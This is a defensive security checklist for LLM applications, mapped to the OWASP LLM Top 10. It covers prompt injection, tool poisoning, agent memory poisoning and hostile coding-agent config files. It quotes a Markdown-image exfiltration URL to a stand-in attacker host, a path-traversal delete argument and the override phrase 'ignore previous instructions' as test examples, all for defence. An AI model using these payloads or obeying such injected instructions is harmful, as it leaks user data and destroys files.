# AI / LLM applications: chatbots, agents, RAG, MCP

Mapped to the OWASP Top 10 for LLM Applications 2025 (LLM01–LLM10).

## 1. Prompt injection (LLM01)

- Any external text can contain instructions: user messages, web pages, PDFs, emails, RAG chunks, tool results, MCP tool descriptions, image text.
- The system prompt is not a security boundary. Enforce permissions in code, with the identity of the end user, not the identity of the agent.
- An agent that reads untrusted content must not also hold dangerous tools without confirmation. Split the roles: one model reads untrusted text without tools, another model acts on structured, validated output.
- Check for "lethal trifecta": access to private data + exposure to untrusted content + a way to send data out. If all three are present, remove one, or require human confirmation for each outbound action.

## 2. Output handling (LLM05)

- Model output is untrusted input. Never pass it to `eval`, `exec`, a shell, SQL, `innerHTML`, a file path, or a redirect.
- Request structured output (JSON schema / tool call) and validate it with a schema (Pydantic, zod) before you use it.
- LLM-generated SQL: a read-only database user, an allowlist of tables, row-level security, a row limit, a timeout.
- Render model output as text, or as Markdown with a sanitizer.

## 3. Data exfiltration channels

- Markdown images and links in model output: `![](https://attacker.example/?d=<data>)`. The browser loads the image and sends the data. Block remote images, or allow only listed domains.
- Tools that send data out: HTTP fetch, email, webhook, file upload, creating a public link. Each call needs an allowlist or a confirmation.

## 4. Excessive agency (LLM06)

- Each tool has the smallest scope: read-only by default; a separate token for each user; no admin tokens.
- Human confirmation before irreversible or external actions: delete, payment, sending messages, changing permissions, publishing.
- Validate every tool argument in code: type, range, allowlist. Example attack: the model calls `delete_file("../../")`.
- Limit agent loops: max steps, max tool calls, max time, max cost.

## 5. Code execution tools

- A tool that runs model-written code (Python REPL, shell) runs only in a sandbox: container or VM, no network or an allowlist, no secrets in the environment, CPU, memory and time limits, a read-only file system except a work folder.
- LangChain: `PythonREPLTool`, `allow_dangerous_code=True`, `allow_dangerous_requests=True`, shell tools → only in a sandbox.

## 6. Secrets and private data in context (LLM02, LLM07)

- No API keys, passwords or connection strings in prompts or in the system prompt. Assume the system prompt will leak.
- No data of other users in the context.
- Minimize personal data in prompts. Check the retention and training policy of the LLM provider. A data processing agreement is needed for personal data.
- Prompts and responses in logs: mask secrets and personal data; set a retention period.

## 7. Multi-user isolation (LLM08)

- Conversation history, memory, caches and vector store queries filter by user or tenant on the server. Cache keys contain the user ID.
- RAG retrieval applies the document permissions of the user who asks. A metadata filter from the client is not access control.
- Separate collections or namespaces for each tenant when data is sensitive.

## 8. RAG and data poisoning (LLM04, LLM08)

- Who can add documents to the knowledge base? Each writer is a possible injection source.
- Validate and clean documents before indexing. Keep the source and the author for each chunk.
- Fine-tuning data comes from trusted sources only.

## 9. Unbounded consumption (LLM10)

- `max_tokens` on every call. Input length limit.
- Rate limits and quotas for each user. Budget alerts and a spend limit in the provider console.
- Timeouts and retry limits. Recursion and loop limits for agents.

## 10. API keys of LLM providers

- Never in frontend code, mobile apps, notebook outputs or public repositories. Call the provider from a backend.
- Separate keys for development and production. Rotate keys after a leak.

## 11. Model and package supply chain (LLM03)

- `torch.load` without `weights_only=True`, `pickle`/`joblib` model files, `.pkl` from the internet → remote code execution. Prefer `safetensors`.
- Hugging Face `trust_remote_code=True` runs code from the model repository. Pin `revision=` to a commit hash and review the code.
- LangChain `FAISS.load_local(..., allow_dangerous_deserialization=True)` → only for files that you created.
- Package names suggested by an AI assistant: check that the package exists and is the intended one (slopsquatting).

## 12. MCP servers and tools

- Install only trusted MCP servers. Pin versions. Review tool descriptions after each update: a description can contain hidden instructions (tool poisoning), and an update can change behavior (rug pull).
- A local stdio MCP server runs with your user rights: it can read your files and keys.
- Give MCP servers tokens with minimal scope. Do not pass the user token through to other services (confused deputy).
- Your own MCP server: validate all tool arguments on the server; authenticate remote clients (OAuth); limit rates.

## 13. Agent memory and multi-agent systems

- Persistent memory (notes, a memory file, a vector store that the agent writes to) is an injection target: text saved from one poisoned document steers every later session. Save only validated facts, keep the source of each entry, and let the user see and delete entries.
- A message from another agent is untrusted input, like a tool result. A subagent gets only the tools and data that its task needs. It must not inherit the rights of the orchestrator.
- Give each agent its own identity and token. Log each tool call with the agent and the end user.

## 14. Coding-agent files in the repository

These files control an AI coding agent. In a cloned or third-party repository they are untrusted. Review them before you open the repository with an agent, and report them in an audit.

- Instruction files: `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.cursor/rules/`, `.github/copilot-instructions.md`, skill and command files. Look for instructions to skip checks, to send data out, or to run commands. Look for hidden characters (see checklist section I).
- `.claude/settings.json`: broad `permissions.allow` rules such as `Bash(*)`, `defaultMode: "bypassPermissions"`, `hooks` that run shell commands, `enableAllProjectMcpServers: true`.
- `.mcp.json`: each server is code that runs with your user rights. Check the command, the package name and the version.
- `.vscode/tasks.json` with `"runOn": "folderOpen"`, and `.devcontainer/` commands: they run when the folder opens.

## 15. Misinformation (LLM09)

- Do not let model claims trigger critical actions without a check. Show sources for factual answers. Keep a human in the loop for decisions with high impact.

## 16. Tests

- Keep a small set of attack prompts and run it before each release:
  - direct injection ("ignore previous instructions and ...");
  - indirect injection inside a document or web page that the app reads;
  - exfiltration through a Markdown image;
  - a request for another user's data;
  - a tool call with a malicious argument.
- A test passes when the app refuses, or when the code blocks the action, whatever the model writes.
